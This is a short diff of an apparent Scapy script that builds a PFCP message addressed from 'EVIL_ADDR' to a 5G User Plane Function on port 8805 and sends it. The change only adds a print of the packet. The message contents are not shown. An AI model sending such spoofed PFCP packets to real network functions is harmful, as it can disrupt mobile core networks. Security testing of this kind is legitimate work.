@@ -50,5 +50,7 @@ pfcp_msg = PFCP(
 
 packet = IP(src=EVIL_ADDR, dst=UPF_ADDR)/UDP(sport=8805, dport=8805)/pfcp_msg
 
+
+print("Packet:", packet.show())
 send(packet)
 print(f"Packet sent")
